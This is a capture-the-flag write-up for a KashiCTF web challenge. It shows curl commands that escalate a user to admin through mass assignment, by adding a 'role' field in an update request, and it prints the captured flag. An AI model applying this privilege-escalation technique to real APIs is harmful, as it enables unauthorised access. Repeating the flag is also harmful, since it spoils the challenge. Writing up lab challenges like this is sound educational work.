# SuperFastAPI

Solved by: @OS1R1S

### Question:
Made my verty first API!

However I have to still integrate it with a frontend so can't do much at this point lol.

### Solution:
1. Fuzz directory. found /docs
2. Create account
```bash
curl -X 'POST' \
  'http://kashictf.iitbhucybersec.in:21490/create/admin' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "fname": "admin",
  "lname": "admin",
  "email": "try@try.com",
  "gender": "attack helicopter"
}'
```
1. Update account to admin
```bash
curl -X 'PUT' \
  'http://kashictf.iitbhucybersec.in:21490/update/admin' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "fname": "John",
  "lname": "Doe",
  "email": "john.doe@example.com",
  "gender": "male",
  "role": "admin"
}'
```
1. get flag
```bash
curl -X 'GET' \
  'http://kashictf.iitbhucybersec.in:21490/flag/admin' \
  -H 'accept: application/json'
{
  "message": "KashiCTF{m455_4551gnm3n7_ftw_udvAZiNsv}"
}
```

**Flag:** `KashiCTF{m455_4551gnm3n7_ftw_udvAZiNsv}`

